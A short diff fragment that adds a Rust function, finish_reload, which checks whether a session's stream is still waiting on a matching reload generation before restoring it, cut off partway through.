+fn finish_reload(id: &SessionId, reload: Reload, loaded: Result<()>, cx: &mut App) {
+    // Unsubscribed, re-subscribed or closed while the thread loaded: nothing to put back.
+    let waiting = global(cx)
+        .sessions
+        .get(id)
+        .and_then(|state| state.stream.as_ref())
+        .is_some_and(|stream| stream.generation == reload.generation && stream.attached.is_none());
+    if !waiting {
